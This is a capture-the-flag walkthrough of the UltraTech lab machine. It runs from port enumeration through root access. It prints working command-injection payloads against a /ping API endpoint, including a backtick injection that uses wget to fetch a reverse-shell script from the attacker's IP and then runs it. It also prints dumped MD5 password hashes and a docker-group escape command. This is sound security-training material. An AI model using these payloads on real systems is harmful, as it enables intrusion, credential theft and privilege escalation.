# UltraTech Walkthrough  

## Enumeration  

I began with a quick Rustscan to identify open ports:  

    rustscan -a 10.10.128.241 -- -sC -sV  

The following ports were revealed:  
- 21 (FTP)  
- 22 (SSH)  
- 8081 (Node.js Express)  
- 31331 (Apache webserver)  

A more thorough Nmap scan confirmed:  

- Port 21 (FTP): vsftpd 3.0.3, anonymous login not permitted.  
- Port 22 (SSH): OpenSSH 7.6p1 Ubuntu 4ubuntu0.3.  
- Port 8081 (HTTP): Node.js Express app, “UltraTech API v0.1.3”.  
- Port 31331 (HTTP): Apache 2.4.29 hosting the UltraTech corporate website.  

At this point, I had two web services to dig into: the API on 8081 and the website on 31331.  

---

## Enumerating Web Content  

### Port 8081 (API)  

Using Gobuster:  

    gobuster dir -u http://10.10.128.241:8081 \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt  

Results:  
- /auth   (Status: 200)  
- /ping   (Status: 500)  

### Port 31331 (Website)  

    gobuster dir -u http://10.10.128.241:31331 \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt  

Results:  
- /index.html  
- /partners.html  
- /what.html  
- /robots.txt  
- /images  
- /css  
- /js  
- /javascript  

In the /js folder, I found api.js. Reading through it showed that all form submissions were redirected to the API on port 8081, specifically /auth, and that it constantly probed /ping. This hinted strongly that the API was the weak point.  

---

## Exploiting /ping  

First, I tested if the /ping endpoint would echo traffic back to me:  

    http://10.10.128.241:8081/ping?ip=10.9.4.133  

Sure enough, I received ICMP packets on my machine. Good sign.  

Next, I attempted basic injections with separators like `;id` and `&&whoami`. These didn’t work — the input was being filtered.  

Then I tried command substitution with backticks:  

    http://10.10.128.241:8081/ping?ip=`uname%20-a`  

The response came back:  

    ping: GNU/Linux: Temporary failure in name resolution  

This error meant the command did execute, but its output was being swallowed as a hostname for ping. That confirmed blind command injection.  

---

## Reverse Shell Attempts  

Direct reverse shell one-liners didn’t succeed, even after URL-encoding. Likely escaping issues.  

To work around this, I uploaded a script to the target. First I made a simple shell script (shell.sh) on my attacker box with a reverse shell payload. Then I uploaded it using injection:  

    http://10.10.128.241:8081/ping?ip=`wget%2010.9.4.133/shell.sh%20-O%20shell.sh`  

Finally, I executed it:  

    http://10.10.128.241:8081/ping?ip=`bash%20shell.sh`  

This gave me a working shell as the www user.  

---

## Post-Exploitation as www  

In the API directory, I checked the source:  

    ls -la ~/api  
    cat package.json  
    cat index.js  

Key findings in index.js:  
- shelljs was used in the /ping route to execute system commands.  
- sqlite3 handled a local SQLite database (utech.db.sqlite).  
- md5 was used for password hashing.  
- A developer comment referenced user r00t and misconfigurations.  

This confirmed the design flaws I had already exploited.  

---

## Database Loot  

I opened the database:  

    sqlite3 utech.db.sqlite  
    sqlite> .tables  
    sqlite> select * from users;  

Output:  

    r00t f357a0c52799563c7c7b76c1e7543a32  
    admin 0d0ea5111e3c1def594c1684e3b9be84  

Cracking the hashes revealed valid credentials. Logging in with SSH as r00t was successful.  

---

## Privilege Escalation  

Once inside as r00t, I checked:  

    id  
    sudo -l  
    find / -perm -4000 -type f 2>/dev/null  

No sudo rights.  
No interesting SUIDs.  

But group membership showed:  

    uid=1001(r00t) gid=1001(r00t) groups=1001(r00t), 998(docker)  

This was the breakthrough.  

---

## Docker Escape  

From GTFOBins, I knew that being in the docker group meant I could spawn a container with access to the host filesystem.  

Running:  

    docker run -v /:/mnt --rm -it bash chroot /mnt sh  

Dropped me into a root shell on the host.  

---

## Summary  

- Enumeration revealed the API and website.  
- /ping was vulnerable to command injection due to unsafe use of shelljs.  
- Blind RCE confirmed with backticks.  
- Script upload and execution provided a foothold as www.  
- SQLite database stored MD5-hashed credentials, one of which unlocked SSH as r00t.  
- Docker group membership allowed escape to full root using a GTFOBins technique.  

✅ Final result: root access to the host system.  
